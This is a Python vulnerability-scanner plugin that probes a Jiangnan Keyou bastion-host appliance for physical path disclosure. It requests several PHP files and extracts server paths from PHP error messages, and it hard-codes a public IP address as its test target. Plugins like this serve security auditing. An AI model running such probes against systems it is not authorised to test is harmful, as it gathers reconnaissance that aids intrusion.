#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 江南科友堡垒机爆物理路径漏洞集合
#__Refer___ = www.wooyun.org/bugs/wooyun-2015-0135704
import re


def assign(service, arg):
    if service == 'hac_gateway':
        return True, arg


def audit(arg):
    payloads = ['excel/Spreadsheet/Excel/Writer.php',
                'excel/Spreadsheet/Excel/Writer/Format.php',
                'excel/Spreadsheet/Excel/Writer/Parser.php',
                'excel/Spreadsheet/Excel/Writer/BIFFwriter.php',
                'excel/Spreadsheet/Excel/Writer/Workbook.php',
                'excel/Spreadsheet/Excel/Writer/Worksheet.php']
    for payload in payloads:
        url = arg + payload
        code, head, res, errorcode, _ = curl.curl2(url)
        if code == 200:
            m = re.search(
                'No such file or directory in <b>([^<]+)</b> on line <b>(\d+)</b>', res)
            if m:
                security_info(m.group(1))
                break

if __name__ == '__main__':
    from dummy import *
    audit(assign('hac_gateway', 'https://123.124.158.72/')[1])